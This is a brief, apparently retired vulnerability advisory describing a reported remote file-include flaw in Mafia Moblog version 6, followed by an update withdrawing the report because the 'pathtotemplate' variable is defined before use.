Mafia Moblog is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

Version 6 is vulnerable to this issue; other versions may also be affected.

Update: After further analysis, this BID is being retired. The 'pathtotemplate' variable is defined in the 'template.php' file prior to its use in the affected script.
